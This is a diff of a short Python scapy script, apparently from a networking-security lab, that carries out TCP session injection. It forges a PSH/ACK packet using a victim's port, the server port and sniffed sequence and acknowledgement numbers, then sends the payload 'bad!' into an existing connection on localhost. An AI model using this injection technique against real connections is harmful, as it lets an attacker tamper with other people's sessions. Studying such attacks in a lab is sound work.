@@ -11,23 +11,21 @@ scapy.conf.L3socket=scapy.L3RawSocket
 	print("not enough arguments")
 	print("src port of the victim, server port, seq number, ack number")
 
-else:"""
-# args to be sent to machineA
-full_message =  "bad!"
+else:
+"""
 
-# connection establishment
-#Put the victim's port
-sport = 42168
+full_message =  "bad!" # args to be sent to machineA
+
+###### CHANGE THESE WITH THE RIGHT VALUES - you can use Wireshark to get them
+sport = 42168 # VICTIM PORT
+dport = 4446 # SERVER PORT
+seq = 1790383696 # SEQUENCE NUMBER
+ack = 1054105548 # ACK NUMBER
+######
+
 src=dest="127.0.0.1"
-#Put the server port
-dport=4446
 ip=scapy.IP(src=src,dst=dest)
-# put the seqence number and the ack of the previous ACK created by the previous messages.
-PHACK=scapy.TCP(sport=sport,dport=dport,flags='PA',seq=1790383696,ack=1054105548)
+PHACK=scapy.TCP(sport=sport,dport=dport,flags='PA',seq=seq,ack=ack)
 scapy.send(ip/PHACK/full_message)
-
-
-
-
 
 # to be nice, you should send the FIN/ACK, ACK pkts now ...
